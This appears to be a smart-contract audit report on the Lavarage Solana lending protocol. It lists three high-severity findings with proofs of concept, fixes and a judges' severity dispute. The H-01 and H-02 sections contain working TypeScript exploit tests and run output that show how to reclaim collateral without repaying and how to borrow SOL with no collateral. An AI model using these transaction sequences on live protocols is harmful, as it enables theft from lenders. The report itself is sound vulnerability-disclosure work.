[H-01] Collateral can be claimed back without repaying its corresponding loan due to insufficient instruction validation
Submitted byArabadzhiev, also found byKoolex
Users can bypass the repayment of their loans when claiming their collateral, which can be abused in order to drain any trading pool.
Proof of Concept
Theborrow_collateralfunction located inside theswapback.rsfile lacks a crucial instruction validation check - a check for verifying that therandom_account_as_idvalue passed into therepay_solinstruction context is not the same as that passed into theborrow_collateralinstruction context. What this effectively means is that users can pass in an instruction that callsrepay_solwith aposition_accountvalue that is different than the one passed intoborrow_collateral. This can be abused in order to claim the collateral for one position, while repaying the borrowed SOL for another (even if that one was already repaid), making it possible to claim back collateral while repaying practically nothing, if the repayed position is one with a dust amount borrowed.
The following coded PoC demonstrates the issue at question. To run it, paste it at the bottom of thelavaragedescribe block in thelavarage.spec.tstest file and then runanchor testinlibs/smart-contracts. The tests insidelavarage.spec.tsare stateful, so the order in which they are executed does matter.
it('Should allow claiming collateral without repaying the loan',async()=>{constrandomAccountSeed1=Keypair.generate();constrandomAccountSeed2=Keypair.generate();consttradingPool=getPDA(program.programId, [Buffer.from('trading_pool'),provider.publicKey.toBuffer(),tokenMint.toBuffer(),]);// increase max borrow to 1 SOL so that we don't have to mint more tokensawaitprogram.methods.lpOperatorUpdateMaxBorrow(newanchor.BN(1000000000)).accountsStrict({tradingPool,nodeWallet:nodeWallet.publicKey,operator:provider.publicKey,systemProgram:anchor.web3.SystemProgram.programId,}).rpc();awaitprogram.methods.lpOperatorFundNodeWallet(newanchor.BN(5000000000)).accounts({nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,funder:program.provider.publicKey,}).rpc();consttraderBalanceBefore=awaitprovider.connection.getBalance(provider.publicKey,);constpositionAccount=getPDA(program.programId, [Buffer.from('position'),provider.publicKey?.toBuffer(),tradingPool.toBuffer(),randomAccountSeed1.publicKey.toBuffer(),]);constpositionATA=awaitgetOrCreateAssociatedTokenAccount(provider.connection,anotherPerson,tokenMint,positionAccount,true,);// opening a first very small borrow position that we will use for callig `add_collateral` with for the secondconstborrowIx1=awaitprogram.methods.tradingOpenBorrow(newanchor.BN(5),newanchor.BN(4)).accountsStrict({positionAccount,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,randomAccountAsId:randomAccountSeed1.publicKey,// frontend fee receiver. could be any address. opening fee 0.5%feeReceipient:anotherPerson.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:anchor.web3.SYSVAR_CLOCK_PUBKEY,instructions:anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,}).instruction();consttransferIx1=createTransferCheckedInstruction(userTokenAccount.address,tokenMint,positionATA.address,provider.publicKey,100000000,9,);constaddCollateralIx1=awaitprogram.methods.tradingOpenAddCollateral().accountsStrict({positionAccount,tradingPool,systemProgram:anchor.web3.SystemProgram.programId,trader:provider.publicKey,randomAccountAsId:randomAccountSeed1.publicKey,mint:tokenMint,toTokenAccount:positionATA.address,}).instruction();constreceiveCollateralIx1=awaitprogram.methods.tradingCloseBorrowCollateral().accountsStrict({positionAccount,trader:provider.publicKey,tradingPool,instructions:SYSVAR_INSTRUCTIONS_PUBKEY,systemProgram:anchor.web3.SystemProgram.programId,clock:SYSVAR_CLOCK_PUBKEY,randomAccountAsId:randomAccountSeed1.publicKey,mint:tokenMint,toTokenAccount:userTokenAccount.address,fromTokenAccount:positionATA.address,tokenProgram:TOKEN_PROGRAM_ID,}).instruction();constrepaySOLIx1=awaitprogram.methods.tradingCloseRepaySol(newanchor.BN(0),newanchor.BN(9997)).accountsStrict({positionAccount,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:SYSVAR_CLOCK_PUBKEY,randomAccountAsId:randomAccountSeed1.publicKey,feeReceipient:anotherPerson.publicKey,}).instruction();consttx1=newTransaction().add(borrowIx1).add(transferIx1).add(addCollateralIx1).add(receiveCollateralIx1).add(repaySOLIx1);awaitprovider.sendAll([{tx:tx1}]);constpositionAccount2=getPDA(program.programId, [Buffer.from('position'),provider.publicKey?.toBuffer(),tradingPool.toBuffer(),randomAccountSeed2.publicKey.toBuffer(),]);constpositionATA2=awaitgetOrCreateAssociatedTokenAccount(provider.connection,anotherPerson,tokenMint,positionAccount2,true,);// second borrow ix that borrows an actual meaningful amount of SOLconstactualBorrowAmount=50000000;constborrowIx2=awaitprogram.methods.tradingOpenBorrow(newanchor.BN(actualBorrowAmount+10000000),newanchor.BN(10000000),).accountsStrict({positionAccount:positionAccount2,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,randomAccountAsId:randomAccountSeed2.publicKey,feeReceipient:anotherPerson.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:anchor.web3.SYSVAR_CLOCK_PUBKEY,instructions:anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,}).instruction();consttransferIx2=createTransferCheckedInstruction(userTokenAccount.address,tokenMint,positionATA2.address,provider.publicKey,10000000000,9,);constaddCollateralIx2=awaitprogram.methods.tradingOpenAddCollateral().accountsStrict({positionAccount:positionAccount2,tradingPool,systemProgram:anchor.web3.SystemProgram.programId,trader:provider.publicKey,randomAccountAsId:randomAccountSeed2.publicKey,mint:tokenMint,toTokenAccount:positionATA2.address,}).instruction();constreceiveCollateralIx2=awaitprogram.methods.tradingCloseBorrowCollateral().accountsStrict({positionAccount:positionAccount2,trader:provider.publicKey,tradingPool,instructions:SYSVAR_INSTRUCTIONS_PUBKEY,systemProgram:anchor.web3.SystemProgram.programId,clock:SYSVAR_CLOCK_PUBKEY,randomAccountAsId:randomAccountSeed2.publicKey,mint:tokenMint,toTokenAccount:userTokenAccount.address,fromTokenAccount:positionATA2.address,tokenProgram:TOKEN_PROGRAM_ID,}).instruction();consttx2=newTransaction().add(borrowIx2).add(transferIx2).add(addCollateralIx2).add(receiveCollateralIx2).add(repaySOLIx1);// reuseing the first repay ix, which effectively means that we are going to repay// for the first possition a second time instead of the current one being closedawaitprovider.sendAll([{tx:tx2}]);consttraderBalanceAfter=awaitprovider.connection.getBalance(provider.publicKey,);consttraderBalanceGains=traderBalanceAfter-traderBalanceBefore;console.log('traderBalanceBefore: ',traderBalanceBefore);console.log('traderBalanceAfter: ',traderBalanceAfter);console.log('traderBalanceGains: ',traderBalanceGains);expect(traderBalanceGains).toBeGreaterThan(actualBorrowAmount*0.9);// approximate the gains due to fee deductions});
Recommended Mitigation Steps
Replace the current verification checks with a single one for theposition_accountvalue:
if ix_discriminator == crate::instruction::TradingCloseRepaySol::DISCRIMINATOR {-                   require_keys_eq!(-                       ix.accounts[2].pubkey,-                       ctx.accounts.trading_pool.key(),-                       FlashFillError::IncorrectProgramAuthority-                   );-                   require_keys_eq!(-                       ix.accounts[1].pubkey,-                       ctx.accounts.trader.key(),-                       FlashFillError::IncorrectProgramAuthority-                   );-                   require_keys_eq!(-                       ctx.accounts.position_account.trader.key(),-                       ctx.accounts.trader.key(),-                       FlashFillError::IncorrectProgramAuthority-                   );-                   require_keys_eq!(-                       ctx.accounts.position_account.pool.key(),-                       ctx.accounts.trading_pool.key(),-                       FlashFillError::IncorrectProgramAuthority-                   );+                   require_keys_eq!(+                       ix.accounts[0].pubkey,+                       ctx.accounts.position_account.key(),+                       FlashFillError::IncorrectProgramAuthority+                   );...}
Assessed type
Invalid Validation
piske-alex (Lavarage) confirmed

[H-02] A borrower can borrow SOL without backing it by a collateral
Submitted byKoolex, also found byArabadzhievandrvierdiiev
The borrower can borrow SOL from the lender without backing it by a collateral. This is possible because the borrower can open two positions at the same time (same TX) but link bothaddCollateralto one position. Althoughborrowchecks the existence ofaddCollateral, it doesn’t check if the positions match.
This can be done as follows:
The borrower opens two positions (Pos#1andPos#2).When opening the position, the borrower links both collateral toPos#1.The borrower repaysPos#1.borrowed, Thus, withdrawing both collaterals.Now, the protocol has no collaterals.The borrower got away withPos#2.borrowedwithout adding a collateral.
Check the PoC below, It demonstrates how a thief could perform the scenario above.
Proof of Concept
Please create a filetests/poc_extract_col_and_sol_lavarage.spec.ts) , then run the following command:
```shORACLE_PUB_KEY=ATeSYS4MQUs2d6UQbBvs9oSNvrmNPU1ibnS2Dmk21BKZ anchor test```
You should see the following output:
```shconsole.log===== Initial Amounts======at tests/poc_extract_col_and_sol_lavarage.spec.ts:311:13console.logPos#1.collateral    :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:313:13console.logPos#2.collateral    :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:314:13console.logBorrower Collateral :  200000000000000000nat tests/poc_extract_col_and_sol_lavarage.spec.ts:315:13console.logNode Sol            :  500001294560at tests/poc_extract_col_and_sol_lavarage.spec.ts:317:13console.logBorrower Sol        :  499999499996989200at tests/poc_extract_col_and_sol_lavarage.spec.ts:318:13console.log===== After Borrow #1 and #2======at tests/poc_extract_col_and_sol_lavarage.spec.ts:335:13console.logPos#1.collateral    :  200000000000000000nat tests/poc_extract_col_and_sol_lavarage.spec.ts:355:13console.logPos#2.collateral    :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:356:13console.logBorrower Collateral :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:357:13console.logNode Sol            :  495001294555at tests/poc_extract_col_and_sol_lavarage.spec.ts:361:13console.logBorrower Sol        :  499999504967724700at tests/poc_extract_col_and_sol_lavarage.spec.ts:362:13console.log>>===== Now, repay borrow#1 only and withdraw all of my collaterals======>>at tests/poc_extract_col_and_sol_lavarage.spec.ts:400:13console.log===== After Successful Repay ======at tests/poc_extract_col_and_sol_lavarage.spec.ts:404:13console.logPos#1.collateral    :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:422:13console.logPos#2.collateral    :  0nat tests/poc_extract_col_and_sol_lavarage.spec.ts:423:13console.logBorrower Collateral :  200000000000000000nat tests/poc_extract_col_and_sol_lavarage.spec.ts:424:13console.logNode Sol            :  495001294560at tests/poc_extract_col_and_sol_lavarage.spec.ts:428:13console.logBorrower Sol        :  499999504967719600at tests/poc_extract_col_and_sol_lavarage.spec.ts:429:13PASS  tests/poc_extract_col_and_sol_lavarage.spec.ts (7.679 s)lavarage✓ Should mint new token! (1849 ms)✓ Should create lpOperator node wallet (451 ms)✓ Should create trading pool (454 ms)✓ Should fund node wallet (463 ms)✓ Should set maxBorrow (455 ms)✓ Hacker can extract SOL and Collaterl (1842 ms)Test Suites: 1 passed, 1 totalTests:       6 passed, 6 totalSnapshots:   0 totalTime:        7.749 sRan all test suites.```
Summary of balances:
Before the attackLender SOL => 500.001294560Lender CollateralPos#1=> 0Lender CollateralPos#2=> 0Borrower SOL => 499999499.996989200Borrower Collateral => 200000000.000000000After borrowing (Notice thatPos#2has no collateral)Lender SOL => 495.001294555Lender CollateralPos#1=> 200000000.000000000Lender CollateralPos#2=> 0Borrower SOL => 499999504.967724700Borrower Collateral => 0After repayLender SOL => 495.001294560Lender CollateralPos#1=> 0Lender CollateralPos#2=> 0Borrower SOL => 499999504.967719600Borrower Collateral => 200000000.000000000
Test file:
import*asanchorfrom'@coral-xyz/anchor';import{Keypair,PublicKey,Signer,SystemProgram,SYSVAR_CLOCK_PUBKEY,SYSVAR_INSTRUCTIONS_PUBKEY,Transaction,}from'@solana/web3.js';import{Lavarage}from'../target/types/lavarage';import{createMint,createTransferCheckedInstruction,getAccount,getOrCreateAssociatedTokenAccount,mintTo,TOKEN_PROGRAM_ID,}from'@solana/spl-token';import{web3}from'@coral-xyz/anchor';exportfunctiongetPDA(programId,seed) {constseedsBuffer=Array.isArray(seed) ?seed: [seed];returnweb3.PublicKey.findProgramAddressSync(seedsBuffer,programId)[0];}describe('lavarage', ()=>{anchor.setProvider(anchor.AnchorProvider.env());constprogram:anchor.Program<Lavarage> =anchor.workspace.Lavarage;constnodeWallet=anchor.web3.Keypair.generate();constanotherPerson=anchor.web3.Keypair.generate();constseed=anchor.web3.Keypair.generate();// TEST ONLY!!! DO NOT USE!!!constoracleKeyPair=anchor.web3.Keypair.fromSecretKey(Uint8Array.from([70,207,196,18,254,123,0,205,199,137,184,9,156,224,62,74,209,0,80,73,146,151,175,68,182,180,53,91,214,7,167,209,140,140,158,10,59,141,76,114,109,208,44,110,77,64,149,121,7,226,125,0,105,29,76,131,99,95,123,206,81,5,198,140,]),);lettokenMint;letuserTokenAccount;lettokenMint2;letuserTokenAccount2;constprovider=anchor.getProvider();asyncfunctionmintMockTokens(people:Signer,provider:anchor.Provider,amount:number,):Promise<any> {constconnection=provider.connection;constsignature=awaitconnection.requestAirdrop(people.publicKey,2000000000,);awaitconnection.confirmTransaction(signature,'confirmed');// Create a new mintconstmint=awaitcreateMint(connection,people,people.publicKey,null,9,// Assuming a decimal place of 9);// Get or create an associated token account for the recipientconstrecipientTokenAccount=awaitgetOrCreateAssociatedTokenAccount(connection,people,mint,provider.publicKey,);// Mint new tokens to the recipient's token accountawaitmintTo(connection,people,mint,recipientTokenAccount.address,people,amount,);return{mint,recipientTokenAccount,};}// Setup phaseit('Should mint new token!',async()=>{const{mint,recipientTokenAccount} =awaitmintMockTokens(anotherPerson,provider,200000000000000000,// 200000000000,);tokenMint=mint;userTokenAccount=recipientTokenAccount;},20000);it('Should create lpOperator node wallet',async()=>{awaitprogram.methods.lpOperatorCreateNodeWallet().accounts({nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,operator:program.provider.publicKey,}).signers([nodeWallet]).rpc();});it('Should create trading pool',async()=>{consttradingPool=getPDA(program.programId, [Buffer.from('trading_pool'),provider.publicKey.toBuffer(),tokenMint.toBuffer(),]);awaitprogram.methods.lpOperatorCreateTradingPool(50).accounts({nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,operator:program.provider.publicKey,tradingPool,mint:tokenMint,}).rpc();});it('Should fund node wallet',async()=>{awaitprogram.methods.lpOperatorFundNodeWallet(newanchor.BN(500000000000)).accounts({nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,funder:program.provider.publicKey,}).rpc();});it('Should set maxBorrow',async()=>{consttradingPool=getPDA(program.programId, [Buffer.from('trading_pool'),provider.publicKey.toBuffer(),tokenMint.toBuffer(),]);// X lamports per 1 Tokenawaitprogram.methods.lpOperatorUpdateMaxBorrow(newanchor.BN(50)).accountsStrict({tradingPool,nodeWallet:nodeWallet.publicKey,operator:provider.publicKey,systemProgram:anchor.web3.SystemProgram.programId,}).rpc();});// repayit('Hacker can extract SOL and Collaterl',async()=>{//constseed=Keypair.generate();constseed2=Keypair.generate();consttradingPool=getPDA(program.programId, [Buffer.from('trading_pool'),provider.publicKey.toBuffer(),tokenMint.toBuffer(),]);// create ATA for position accountconstpositionAccount=getPDA(program.programId, [Buffer.from('position'),provider.publicKey?.toBuffer(),tradingPool.toBuffer(),// unique identifier for the positionseed.publicKey.toBuffer(),]);constpositionATA=awaitgetOrCreateAssociatedTokenAccount(provider.connection,anotherPerson,tokenMint,positionAccount,true,);// create ATA for position account 2constpositionAccount2=getPDA(program.programId, [Buffer.from('position'),provider.publicKey?.toBuffer(),tradingPool.toBuffer(),// unique identifier for the positionseed2.publicKey.toBuffer(),]);constpositionATA2=awaitgetOrCreateAssociatedTokenAccount(provider.connection,anotherPerson,tokenMint,positionAccount2,true,);// actual borrowconstborrowIx=awaitprogram.methods.tradingOpenBorrow(newanchor.BN(10),newanchor.BN(5)).accountsStrict({positionAccount,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,randomAccountAsId:seed.publicKey,// frontend fee receiver. could be any address. opening fee 0.5%feeReceipient:anotherPerson.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:anchor.web3.SYSVAR_CLOCK_PUBKEY,instructions:anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,}).instruction();consttransferIx=createTransferCheckedInstruction(userTokenAccount.address,tokenMint,positionATA.address,provider.publicKey,100000000000000000,9,);consttransferIx2=createTransferCheckedInstruction(userTokenAccount.address,tokenMint,positionATA.address,// transfer to the other account (1st pos)provider.publicKey,100000000000000000,9,);// the param in this method is deprecated. should be removed.constaddCollateralIx=awaitprogram.methods.tradingOpenAddCollateral().accountsStrict({positionAccount,tradingPool,systemProgram:anchor.web3.SystemProgram.programId,trader:provider.publicKey,randomAccountAsId:seed.publicKey,mint:tokenMint,toTokenAccount:positionATA.address,// I need to create this account}).instruction();// actual borrow 2constborrowIx2=awaitprogram.methods.tradingOpenBorrow(newanchor.BN(10000000000),newanchor.BN(5000000000)).accountsStrict({positionAccount:positionAccount2,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,randomAccountAsId:seed2.publicKey,// frontend fee receiver. could be any address. opening fee 0.5%feeReceipient:anotherPerson.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:anchor.web3.SYSVAR_CLOCK_PUBKEY,instructions:anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,}).instruction();// the param in this method is deprecated. should be removed.constaddCollateralIx2=awaitprogram.methods.tradingOpenAddCollateral().accountsStrict({positionAccount:positionAccount,tradingPool,systemProgram:anchor.web3.SystemProgram.programId,trader:provider.publicKey,randomAccountAsId:seed.publicKey,mint:tokenMint,toTokenAccount:positionATA.address,}).instruction();lettokenAccount=awaitgetAccount(provider.connection,positionATA.address,);lettokenAccount2=awaitgetAccount(provider.connection,positionATA2.address,);letuserTokenAcc=awaitgetAccount(provider.connection,userTokenAccount.address,);console.log("===== Initial Amounts======");console.log("Pos#1.collateral    : ",tokenAccount.amount);console.log("Pos#2.collateral    : ",tokenAccount2.amount);console.log("Borrower Collateral : ",userTokenAcc.amount);console.log("Node Sol            : ",awaitprovider.connection.getBalance(nodeWallet.publicKey));console.log("Borrower Sol        : ",awaitprovider.connection.getBalance(provider.publicKey));consttx_borrow=newTransaction().add(borrowIx).add(transferIx).add(addCollateralIx).add(borrowIx2).add(transferIx2).add(addCollateralIx2);// add collateral but link it to first Posawaitprovider.sendAll([{tx:tx_borrow}]);console.log("===== After Borrow #1 and #2======");tokenAccount=awaitgetAccount(provider.connection,positionATA.address,);tokenAccount2=awaitgetAccount(provider.connection,positionATA2.address,);userTokenAcc=awaitgetAccount(provider.connection,userTokenAccount.address,);consttokenAccount_amount=tokenAccount.amount;constuserTokenAcc_amount=userTokenAcc.amount;console.log("Pos#1.collateral    : ",tokenAccount_amount);console.log("Pos#2.collateral    : ",tokenAccount2.amount);console.log("Borrower Collateral : ",userTokenAcc_amount);constnode_balance=awaitprovider.connection.getBalance(nodeWallet.publicKey);constuser_balance=awaitprovider.connection.getBalance(provider.publicKey);console.log("Node Sol            : ",node_balance);console.log("Borrower Sol        : ",user_balance);constreceiveCollateralIx=awaitprogram.methods.tradingCloseBorrowCollateral().accountsStrict({positionAccount:positionAccount,trader:provider.publicKey,tradingPool,instructions:SYSVAR_INSTRUCTIONS_PUBKEY,systemProgram:anchor.web3.SystemProgram.programId,clock:SYSVAR_CLOCK_PUBKEY,randomAccountAsId:seed.publicKey,mint:tokenMint,toTokenAccount:userTokenAccount.address,fromTokenAccount:positionATA.address,tokenProgram:TOKEN_PROGRAM_ID,}).instruction();constrepaySOLIx=awaitprogram.methods// .tradingCloseRepaySol(new anchor.BN(20000), new anchor.BN(9998)).tradingCloseRepaySol(newanchor.BN(0),newanchor.BN(9998)).accountsStrict({positionAccount:positionAccount,trader:provider.publicKey,tradingPool,nodeWallet:nodeWallet.publicKey,systemProgram:anchor.web3.SystemProgram.programId,clock:SYSVAR_CLOCK_PUBKEY,randomAccountAsId:seed.publicKey,feeReceipient:anotherPerson.publicKey,}).instruction();consttx_repay=newTransaction().add(receiveCollateralIx).add(repaySOLIx);console.log(">>===== Now, repay borrow#1 only and withdraw all of my collaterals======>>");awaitprovider.sendAll([{tx:tx_repay}]);console.log("===== After Successful Repay ======");tokenAccount=awaitgetAccount(provider.connection,positionATA.address,);tokenAccount2=awaitgetAccount(provider.connection,positionATA2.address,);userTokenAcc=awaitgetAccount(provider.connection,userTokenAccount.address,);consttokenAccount_amount2=tokenAccount.amount;constuserTokenAcc_amount2=userTokenAcc.amount;console.log("Pos#1.collateral    : ",tokenAccount_amount2);console.log("Pos#2.collateral    : ",tokenAccount2.amount);console.log("Borrower Collateral : ",userTokenAcc_amount2);constnode_balance2=awaitprovider.connection.getBalance(nodeWallet.publicKey);constuser_balance2=awaitprovider.connection.getBalance(provider.publicKey);console.log("Node Sol            : ",node_balance2);console.log("Borrower Sol        : ",user_balance2);});});
Recommended Mitigation Steps
Onborrowvalidate that theTradingOpenAddCollateralhas the relevant position account.
Assessed type
Invalid Validation
piske-alex (Lavarage) confirmed

[H-03] Malicious borrowers will never repay loans with high interest
Submitted byDadeKuma, also found byDadeKumaandArabadzhiev
Borrowers have no incentives to repay the loan if the owed interest grows too much, as the liquidation check fails to take it into consideration when calculating the LTV. This will generate bad debt for the lenders.
Proof of Concept
The liquidation call must pass this check to execute:
require!(ctx.accounts.position_account.amount *1000/ position_size  >900, FlashFillError::ExpectedCollateralNotEnough );
src/processor/liquidate.rs#L27
The issue is that it fails to consider how much interest is owed by the borrower, it only checks how much the user has borrowed at the start of the loan:
ctx.accounts.position_account.amount = position_size - user_pays;
src/processor/swap.rs#L16
As such, if the borrower accumulates a very high interest to pay, the lender has no way to liquidate this position if the original borrowed amount’s LTV (without accrued interest) stays under 90%. These borrowers will never repaid the loan, and this will generate bad debt for lenders.
Recommended Mitigation Steps
Consider adding the owed interest to the total amount when performing the liquidation check.
Assessed type
Invalid Validation
piske-alex (Lavarage) confirmed
alcueca (judge) decreased severity to Medium and commented:
Downgraded to Medium because even if borrowers can effectively steal the borrowed amount, to do so they need to keep an amount of collateral of higher value locked in the protocol.
DadeKuma (warden) commented:
@alcueca - I disagree, as this clearly warrants High severity if we follow the severity categorization. There are zero hypotheticals, any borrower can get a loan for an unlimited amount of time (and not pay ANY interest), without consequences.It’s like saying that I go to the bank to get a loan, never pay the interest (without consequences), and they can’t liquidate me until the collateral I provided is worthless. The bank is experiencing a loss of funds because it is lending money for free.
alcueca (judge) commented:
The attacker is experiencing a larger loss of funds, which makes it a grieving attack, which is Medium.
DadeKuma (warden) commented:
@alcueca - Consider the following case. The lender lends 1000 SOL with a 10% monthly rate. Let’s say that the collateral is worth 1500 SOL.Every month, the borrower should pay 100 SOL, but they can ignore the payments without consequences.After 6 months, the lender has lost more funds than the borrower (they should have earned 600 SOL but they have earned0), and they can’t do anything to claim the collateral, they are lending money for free. But they are forced to wait until the collateral is worthless.Consequences:Lenders miss interest payments, potentially forever.Meanwhile, they can’t offer new loans, as their funds are already locked in this one.The protocol is useless if no one repays their loans as lenders only lose money.If accrued interest is higher than collateral, the borrower will never repay, because at this point the liquidation costs less than the repayment.The lender is accruingbad debt, which is a clear loss of funds for the lender. Recouping the collateral is not enough if their funds stay locked for decades.
alcueca (judge) commented:
When measuring financial losses it is uncommon to consider loss of future income or opportunity cost. I see this vulnerability as the victim putting X assets into the protocol, and the attacker spending Y assets so that the victim loses theirs, with the value of Y greater than the value of X.If the victim would have put their assets somewhere expecting 0% income, for example, in an escrow contract, and they would get locked in the same fashion, you could still make the reasoning that because the victim has been blocked from withdrawing and earning an income on their assets in perpetuity, the issue is a critical.The reasoning can be extended to make all grieving attacks of critical severity, which isn’t fair to attacks where the attacker obtains an actual profit.
DadeKuma (warden) commented:
It’s not future income as interest is accrued daily. High risk means that funds can be compromised directly (it’s worth noting that this isn’t a dust amount, and any borrower can do it). The actual rules say nothing about griefing, and borrowing/lending is a core feature of this protocol.There are multiple scenarios:Scenario 1:The borrower locks collateral but they recoup some immediately by taking the borrowed amount. The lender has no access to any funds until liquidation, which can’t be enforced as interest is not accrued. For a % cost of the total borrowed amount, the attacker can lock a sizeable capital forever.Scenario 2:There is no attacker, and a borrower has lost access to their wallet. The loan remains unliquidable forever, and the lender loses 100% of the capital as there is no time limit for a loan (like described in#9which was duped to this issue).
Picodes (Appellate Court lead judge) commented:
Lavarage Appellate Court DecisionsSummaryIssue#10describes how because loans have no fixed duration and interests are not taken into account into the liquidiation mechanism, lenders cannot count on interests to trigger a liquidation at some point in the future, and there is a point time after which it isn’t profitable anymore for the borrower to pay back its loan.
It’s related to#9which focuses on the business implications of having infinite duration loans.Lavarage’s (sponsor) input:The sponsor was asked for his input on the original design he had in mind and the value added by #9 and #10. Here is his answer:“I can confirm that the design I am willing to implement is that loans do not have a fixed term. But I also agree that that could be a risk on the business logic side. However, we are looking into implementing interest payment collection through sales of collateral instead of setting a fixed time for the loans. As mentioned above I agree that #9 is a valid concern in regards of business logic design. I don’t think we have discussed it in our documentation.”Picodes’ (lead judge) view:I think H is more appropriate as well. For sure there will be users leverage trading and losing their borrowed amount, losing their keys, etc, and the main backstop for lenders is that due to interests they will get their collateral back at some point. That’s the classic behavior for Aave, Compound, Morpho, etc. Without this they can only rely on price movements which isn’t the deal. As a proof I think Aave V2 or deprecated lending markets speaks for themselves where lenders are just waiting for liquidations to be able to withdraw and the amounts at stake are significant.0xTheC0der’s (judge 2) view:I am viewing this from the following perspectives:Adversary:Is never at a profit by not repaying the loan. Would have been better off just swapping the collateral for the borrowed asset. Therefore, a grieving attack and no theft of assets.Protocol:Missing out on interest (loss of yield), but no direct theft. Collateral is unusable/locked until price swing allows liquidation on LTV > 90%, could be pretty permanent in case of stable assets. Bad debt once interest accrual puts actual LTV > 100%, but only “in the books” i.e. no direct loss.Leaning towards High severity due to the indefinite lockup of collateral assets even without malicious user intent which effectively translates into a loss of the value of the borrowed assets. While the warden deserves to have their finding upgraded to High severity, this is a borderline case and also the audit judge’s assessment of Medium severity seems to hold under C4 rules and therefore cannot be labeled a “clear mistake” as the appellate court rules currently suggest in case of a 3/3 agreement on High severity. Consequently, I want my final verdict to be interpreted in such a way that a 2/3 agreement on High severity is reached.Hickuphh3’s (judge 3) view:I think H severity is more appropriate, not because of the loss of unrealised yield (this would be M), but because of the collateral that the lender is entitled to can be indefinitely locked, as long as LTV is <= 90%.Should interest accrual be accounted for, the position will eventually be liquidatable at some point, but excluding it means the condition may only be met from asset price changesVerdictBy a 2/3 consensus, the conclusion from the appellate court is that the ruling should be overruled and the issue should be made ofHigh severity.
Note, this finding was upgraded to High by C4 staff in reference to the Appellate Court decision.

